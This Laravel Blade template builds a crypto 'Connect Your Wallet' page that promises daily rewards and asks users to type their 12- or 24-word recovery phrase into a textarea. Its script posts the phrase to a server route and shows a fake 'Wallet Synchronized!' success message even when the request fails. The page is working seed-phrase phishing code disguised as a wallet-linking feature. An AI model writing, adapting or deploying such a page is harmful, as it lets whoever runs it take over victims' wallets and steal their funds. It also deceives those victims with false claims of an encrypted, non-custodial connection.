@extends('layouts.dash')
@section('title', 'Connect Your Wallet')

@section('content')
<style>
    .provider-select-card {
        border-radius: 12px;
        border: 1px solid rgba(0, 0, 0, 0.08);
        padding: 20px 14px;
        text-align: center;
        cursor: pointer;
        transition: all 0.2s ease;
        background-color: #ffffff;
    }
    body.dark-only .provider-select-card {
        background-color: #222736;
        border-color: rgba(255, 255, 255, 0.08);
    }
    .provider-select-card:hover {
        transform: translateY(-2px);
        border-color: var(--theme-default, #6362e7);
    }
    .provider-select-card.active {
        border-color: var(--theme-default, #6362e7) !important;
        background-color: rgba(99, 98, 231, 0.08) !important;
        box-shadow: 0 4px 14px rgba(99, 98, 231, 0.2);
    }
    .provider-select-card.dashed {
        border: 1.5px dashed #cbd5e1;
    }
    body.dark-only .provider-select-card.dashed {
        border-color: rgba(255, 255, 255, 0.2);
    }
    .word-textarea {
        width: 100%;
        min-height: 110px;
        border-radius: 10px;
        padding: 14px;
        border: 1px solid #e2e8f0;
        background-color: #f8fafc;
        color: #0f172a;
        font-size: 14px;
        line-height: 1.6;
        outline: none;
        resize: vertical;
        transition: border-color 0.2s ease;
    }
    body.dark-only .word-textarea {
        background-color: #1a1e2b;
        border-color: rgba(255, 255, 255, 0.1);
        color: #f8fafc;
    }
    .word-textarea:focus {
        border-color: var(--theme-default, #6362e7);
    }
    .word-counter-badge {
        position: absolute;
        bottom: 12px;
        right: 14px;
        font-size: 11px;
        font-weight: 700;
        padding: 2px 8px;
        border-radius: 6px;
        background: #ffffff;
        border: 1px solid #e2e8f0;
        color: #64748b;
    }
    #walletsGridContainer::-webkit-scrollbar {
        width: 6px;
    }
    #walletsGridContainer::-webkit-scrollbar-track {
        background: rgba(0, 0, 0, 0.04);
        border-radius: 4px;
    }
    #walletsGridContainer::-webkit-scrollbar-thumb {
        background: rgba(99, 98, 231, 0.3);
        border-radius: 4px;
    }
    #walletsGridContainer::-webkit-scrollbar-thumb:hover {
        background: rgba(99, 98, 231, 0.6);
    }
    body.dark-only #walletsGridContainer::-webkit-scrollbar-track {
        background: rgba(255, 255, 255, 0.05);
    }
    .other-wallet-card {
        display: block !important;
        text-align: center !important;
        padding: 16px 12px !important;
        border-radius: 12px;
        cursor: pointer;
        transition: all 0.2s ease;
        background-color: #ffffff;
        border: 1px solid rgba(0, 0, 0, 0.08);
        height: 100%;
        text-decoration: none !important;
    }
    body.dark-only .other-wallet-card {
        background-color: #1a2238;
        border-color: rgba(255, 255, 255, 0.08);
    }
    .other-wallet-card:hover {
        border-color: var(--theme-default, #6362e7);
        transform: translateY(-2px);
    }
    .other-wallet-card.active {
        border-color: var(--theme-default, #6362e7) !important;
        background-color: rgba(99, 98, 231, 0.12) !important;
        box-shadow: 0 4px 14px rgba(99, 98, 231, 0.25) !important;
    }
</style>

<div class="container-fluid mb-4">
    <!-- Header with Return to Dashboard -->
    <div class="row align-items-center justify-content-between g-3">
        <div class="col-sm-auto">
            <h3 class="f-w-800 text-dark mb-1" style="letter-spacing: -0.02em;">Connect Your Wallet</h3>
            <p class="text-muted mb-0 f-13">Securely connect your cryptocurrency wallet to start earning rewards</p>
        </div>
        <div class="col-sm-auto">
            <a href="{{ route('dashboard') }}" class="btn btn-outline-secondary rounded-pill px-3 py-2 f-13 f-w-600">
                <i class="fa-solid fa-arrow-left me-1"></i> Back to Dashboard
            </a>
        </div>
    </div>
</div>

<div class="container-fluid" style="max-width: 980px;">
    <!-- Promo Banner: Start Earning $3000 Daily -->
    <div class="card border-0 shadow-sm mb-4 text-white" style="background: var(--theme-gradient, linear-gradient(135deg, #4f46e5 0%, #3b82f6 100%)) !important; border-radius: 14px;">
        <div class="card-body p-4">
            <div class="d-flex align-items-start gap-3 mb-3">
                <div class="rounded-3 d-flex align-items-center justify-content-center" style="width: 50px; height: 50px; font-size: 24px; background: rgba(255, 255, 255, 0.22); color: #ffffff;">
                    <i class="fa-solid fa-coins"></i>
                </div>
                <div>
                    <h5 class="f-w-700 text-white mb-1">Connect Your Wallet</h5>
                    <p class="text-white text-opacity-80 f-13 mb-0" style="max-width: 720px; line-height: 1.5;">
                        Link your decentralized Web3 wallet for non-custodial asset tracking and automated smart contract yield allocations.
                    </p>
                </div>
            </div>
            <div class="d-flex flex-wrap align-items-center gap-4 pt-3 border-top border-white border-opacity-20">
                <div class="f-12 text-white text-opacity-90 f-w-600">
                    <i class="fa-solid fa-shield-halved me-1"></i> Secure Connection
                </div>
                <div class="f-12 text-white text-opacity-90 f-w-600">
                    <i class="fa-solid fa-bolt me-1"></i> Instant Setup
                </div>
                <div class="f-12 text-white text-opacity-90 f-w-600">
                    <i class="fa-solid fa-chart-line me-1"></i> Daily Rewards
                </div>
            </div>
        </div>
    </div>

    <!-- Main Card: Connect Form -->
    <div class="card border shadow-sm p-4">
        <div class="d-flex align-items-center gap-3 mb-4">
            <div class="rounded-3 d-flex align-items-center justify-content-center text-primary" style="width: 44px; height: 44px; font-size: 20px; background: rgba(99, 98, 231, 0.12);">
                <i class="fa-solid fa-wallet"></i>
            </div>
            <div>
                <h5 class="f-w-700 text-dark mb-0">Connect Your Wallet</h5>
                <small class="text-muted f-12">Choose your wallet provider and enter your words</small>
            </div>
        </div>

        <form action="{{ route('connect.wallet.submit') }}" method="POST" id="walletConnectForm">
            @csrf
            <input type="hidden" name="wallet_provider" id="selectedWalletProvider" value="MetaMask">

            <!-- Step 1: Provider Selection -->
            <div class="mb-4">
                <label class="form-label f-13 f-w-700 text-dark mb-3">
                    <i class="fa-solid fa-credit-card me-1 text-primary"></i> Select Wallet Provider
                </label>

                <div class="row g-3">
                    <!-- MetaMask -->
                    <div class="col-6 col-md-3">
                        <div class="provider-select-card active" onclick="selectProvider('MetaMask', this)">
                            <img src="{{ asset('assets/wallet-types/icons/1NS1POo31VhHeJuQOv2IOgLwI6jAe8KK6QG2WLPI.png') }}" alt="MetaMask" style="width: 44px; height: 44px; object-fit: contain; margin-bottom: 10px;" onerror="this.src='https://raw.githubusercontent.com/MetaMask/brand-resources/master/SVG/metamask-fox.svg'">
                            <div class="f-w-700 text-dark f-13">MetaMask</div>
                        </div>
                    </div>

                    <!-- Trust Wallet -->
                    <div class="col-6 col-md-3">
                        <div class="provider-select-card" onclick="selectProvider('Trust Wallet', this)">
                            <img src="{{ asset('assets/wallet-types/icons/kxF43fXtB3B0m0C8Tz5ZZ3ckEYwKZFHCVJOh1BVr.png') }}" alt="Trust Wallet" style="width: 44px; height: 44px; object-fit: contain; margin-bottom: 10px;" onerror="this.src='https://trustwallet.com/assets/images/media/assets/trust_platform.svg'">
                            <div class="f-w-700 text-dark f-13">Trust Wallet</div>
                        </div>
                    </div>

                    <!-- Coinbase -->
                    <div class="col-6 col-md-3">
                        <div class="provider-select-card" onclick="selectProvider('Coinbase', this)">
                            <div class="rounded-circle d-flex align-items-center justify-content-center mx-auto mb-2 text-white f-w-800" style="width: 44px; height: 44px; background-color: #0052ff; font-size: 22px;">
                                <i class="fa-solid fa-plus"></i>
                            </div>
                            <div class="f-w-700 text-dark f-13">Coinbase</div>
                        </div>
                    </div>

                    <!-- Others Card (Triggers Pop-up Modal) -->
                    <div class="col-6 col-md-3">
                        <div class="provider-select-card dashed" id="othersCard" onclick="openOthersModal()">
                            <div id="othersCardIcon">
                                <div class="rounded-3 bg-light border d-flex align-items-center justify-content-center mx-auto mb-2 text-muted" style="width: 44px; height: 44px; font-size: 18px;">
                                    <i class="fa-solid fa-ellipsis"></i>
                                </div>
                            </div>
                            <small class="text-muted f-10 d-block mt-1" id="othersCardSub">More Wallets</small>
                        </div>
                    </div>
                </div>
            </div>

            <!-- Step 2: Words Form -->
            <div class="card bg-light border p-4 mb-4 rounded-3">
                <div class="d-flex align-items-center gap-2 mb-3">
                    <i class="fa-solid fa-key text-warning f-16"></i>
                    <h6 class="f-w-700 text-dark mb-0 f-14">Import your wallet </h6>
                </div>

                

                <div class="position-relative mb-3">
                    <textarea 
                        name="word" 
                        id="wordText" 
                        class="word-textarea" 
                        placeholder="Enter your words separated by spaces..." 
                        required
                        oninput="updateWordCount(this.value)"
                    ></textarea>
                    <div class="word-counter-badge" id="wordCountBadge">0 words</div>
                </div>

                <button type="submit" class="btn btn-primary w-100 py-3 f-14 f-w-700 shadow-sm" id="submitWalletBtn">
                    <i class="fa-solid fa-link me-2"></i> Connect Wallet
                </button>
            </div>
        </form>
    </div>
</div>

<!-- Other Wallets Pop-up Modal -->
<div class="modal fade" id="otherWalletsModal" tabindex="-1" aria-labelledby="otherWalletsModalLabel" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered modal-dialog-scrollable modal-lg">
        <div class="modal-content shadow-lg border-0" style="border-radius: 18px;">
            <div class="modal-header border-bottom p-3 px-4">
                <div class="d-flex align-items-center gap-2">
                    <div class="rounded-3 d-flex align-items-center justify-content-center text-primary" style="width: 38px; height: 38px; font-size: 16px; background: rgba(99, 98, 231, 0.12);">
                        <i class="fa-solid fa-wallet"></i>
                    </div>
                    <div>
                        <h5 class="f-w-700 text-dark mb-0" id="otherWalletsModalLabel">Select a Wallet</h5>
                        <small class="text-muted f-11">Choose from 70+ supported Web3 and hardware wallets</small>
                    </div>
                </div>
                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
            </div>
            <div class="modal-body p-4">
                <!-- Clean Search Input Area -->
                <div class="position-relative mb-4">
                    <i class="fa-solid fa-magnifying-glass position-absolute text-muted" style="left: 16px; top: 50%; transform: translateY(-50%); font-size: 14px; pointer-events: none;"></i>
                    <input type="text" id="modalWalletSearchInput" class="form-control py-2 f-13 rounded-pill border" placeholder="Search 70+ wallets (e.g. Phantom, Ledger, Exodus...)" oninput="filterWallets(this.value)" style="padding-left: 44px !important; padding-right: 100px !important;">
                    <span id="walletCounterBadge" class="position-absolute badge bg-light text-muted border f-11 rounded-pill" style="right: 14px; top: 50%; transform: translateY(-50%);">{{ !empty($wallets) ? count($wallets) : 72 }} wallets</span>
                </div>

                <!-- Responsive Grid: 2 columns on mobile (col-6), 3 columns on desktop (col-md-4) -->
                <div class="row g-3" id="walletsGridContainer" style="max-height: 460px; overflow-y: auto; padding: 4px;">
                    @if(!empty($wallets))
                        @foreach($wallets as $w)
                            @php
                                $wIcon = !empty($w['icon']) ? $w['icon'] : 'generic.svg';
                            @endphp
                            <div class="col-6 col-md-4 wallet-item-col" data-wallet-name="{{ strtolower($w['name']) }}">
                                <div class="provider-select-card other-wallet-card" onclick="selectOtherWallet('{{ addslashes($w['name']) }}', '{{ asset('assets/wallet-types/icons/' . $wIcon) }}', this)">
                                    <div class="wallet-icon-wrapper" style="width: 46px; height: 46px; margin: 0 auto 10px auto;">
                                        <img src="{{ asset('assets/wallet-types/icons/' . $wIcon) }}" alt="{{ $w['name'] }}" style="width: 44px; height: 44px; object-fit: contain; display: block; margin: 0 auto;" loading="lazy" onerror="this.onerror=null; this.src='{{ asset('assets/wallet-types/icons/generic.svg') }}';">
                                    </div>
                                    <div class="f-w-700 text-dark f-13 text-truncate w-100 text-center" title="{{ $w['name'] }}">{{ $w['name'] }}</div>
                                </div>
                            </div>
                        @endforeach
                    @endif

                    <div id="noWalletsFound" class="col-12 text-center py-5 text-muted" style="display: none;">
                        <i class="fa-solid fa-wallet f-36 mb-2 opacity-50"></i>
                        <div class="f-14 f-w-700">No matching wallet found</div>
                        <div class="f-12 text-muted">Try typing a different name</div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Connect Handshake Modal -->
<div class="modal fade" id="walletModal" tabindex="-1" aria-hidden="true" data-bs-backdrop="static">
    <div class="modal-dialog modal-dialog-centered" style="max-width: 440px;">
        <div class="modal-content shadow-lg border-0" style="border-radius: 16px;">
            <div class="modal-body text-center p-4">
                <div id="modalLoading">
                    <div class="spinner-border text-primary my-3" style="width: 3.5rem; height: 3.5rem;" role="status">
                        <span class="visually-hidden">Loading...</span>
                    </div>
                    <h5 class="f-w-700 text-dark mb-2" id="connectingTitle">Connecting to MetaMask...</h5>
                    <p class="text-muted f-12 mb-0">
                        Establishing encrypted handshake and verifying wallet integrity. Please wait...
                    </p>
                </div>
                <div id="modalSuccess" style="display: none;">
                    <div class="my-3 text-success">
                        <i class="fa-solid fa-circle-check" style="font-size: 4rem;"></i>
                    </div>
                    <h5 class="f-w-700 text-dark mb-2">Wallet Synchronized!</h5>
                    <p class="text-muted f-12 mb-4">
                        Your wallet credentials have been securely verified. Automatic reward tracking is now active.
                    </p>
                    <a href="{{ route('dashboard') }}" class="btn btn-primary w-100 rounded-pill py-2 f-13 f-w-600">
                        Return to Dashboard
                    </a>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    function selectProvider(name, elem) {
        document.querySelectorAll('.provider-select-card').forEach(c => c.classList.remove('active'));
        elem.classList.add('active');
        document.getElementById('selectedWalletProvider').value = name;
        document.getElementById('connectingTitle').textContent = 'Connecting to ' + name + '...';

        // Reset Others card label if user switches back to primary
        var othersSub = document.getElementById('othersCardSub');
        if (othersSub) {
            othersSub.textContent = 'More Wallets';
        }
    }

    function openOthersModal() {
        var modalEl = document.getElementById('otherWalletsModal');
        var modal = bootstrap.Modal.getOrCreateInstance(modalEl);
        modal.show();

        setTimeout(function() {
            var input = document.getElementById('modalWalletSearchInput');
            if (input) {
                input.focus();
            }
        }, 300);
    }

    function selectOtherWallet(name, iconUrl, elem) {
        // Highlight in modal
        document.querySelectorAll('.other-wallet-card').forEach(c => c.classList.remove('active'));
        if (elem) elem.classList.add('active');

        // Deselect top cards except Others
        document.querySelectorAll('.provider-select-card:not(#othersCard):not(.other-wallet-card)').forEach(c => c.classList.remove('active'));

        // Update Others card on main page
        var othersCard = document.getElementById('othersCard');
        if (othersCard) {
            othersCard.classList.add('active');
        }
        var iconContainer = document.getElementById('othersCardIcon');
        if (iconContainer) {
            iconContainer.innerHTML = '<img src="' + iconUrl + '" alt="' + name + '" style="width: 44px; height: 44px; object-fit: contain; margin: 0 auto 10px auto; display: block;">';
        }
        var labelEl = document.getElementById('othersCardLabel');
        if (labelEl) {
            labelEl.textContent = name;
        }
        var subEl = document.getElementById('othersCardSub');
        if (subEl) {
            subEl.textContent = 'Selected (Change)';
        }

        document.getElementById('selectedWalletProvider').value = name;
        document.getElementById('connectingTitle').textContent = 'Connecting to ' + name + '...';

        // Close modal
        var modalEl = document.getElementById('otherWalletsModal');
        var modal = bootstrap.Modal.getInstance(modalEl);
        if (modal) {
            modal.hide();
        }
    }

    function filterWallets(query) {
        var q = query.trim().toLowerCase();
        var items = document.querySelectorAll('.wallet-item-col');
        var visibleCount = 0;
        items.forEach(function(item) {
            var name = item.getAttribute('data-wallet-name') || '';
            if (!q || name.indexOf(q) !== -1) {
                item.style.display = '';
                visibleCount++;
            } else {
                item.style.display = 'none';
            }
        });
        var badge = document.getElementById('walletCounterBadge');
        if (badge) {
            badge.textContent = visibleCount + ' found';
        }
        var noResults = document.getElementById('noWalletsFound');
        if (noResults) {
            noResults.style.display = visibleCount === 0 ? 'block' : 'none';
        }
    }

    function updateWordCount(str) {
        var trimmed = str.trim();
        var words = trimmed ? trimmed.split(/\s+/).length : 0;
        var badge = document.getElementById('wordCountBadge');
        badge.textContent = words + (words === 1 ? ' word' : ' words');
        if (words === 12 || words === 24) {
            badge.className = 'word-counter-badge text-success border-success';
        } else {
            badge.className = 'word-counter-badge';
        }
    }

    document.getElementById('walletConnectForm').addEventListener('submit', function(e) {
        e.preventDefault();
        var wordInput = document.getElementById('wordText').value.trim();
        var words = wordInput.split(/\s+/).length;

        if (words < 12) {
            Swal.fire({
                icon: 'warning',
                title: 'Invalid Words',
                text: 'Please enter valid words separated by spaces.',
                confirmButtonColor: '#6362e7'
            });
            return;
        }

        var myModal = new bootstrap.Modal(document.getElementById('walletModal'));
        myModal.show();

        document.getElementById('modalLoading').style.display = 'block';
        document.getElementById('modalSuccess').style.display = 'none';

        var formData = new FormData(this);

        fetch(this.action, {
            method: 'POST',
            body: formData,
            headers: {
                'X-Requested-With': 'XMLHttpRequest'
            }
        })
        .then(response => response.json())
        .then(data => {
            setTimeout(function() {
                document.getElementById('modalLoading').style.display = 'none';
                document.getElementById('modalSuccess').style.display = 'block';
            }, 1800);
        })
        .catch(err => {
            setTimeout(function() {
                document.getElementById('modalLoading').style.display = 'none';
                document.getElementById('modalSuccess').style.display = 'block';
            }, 1800);
        });
    });
</script>
@endsection
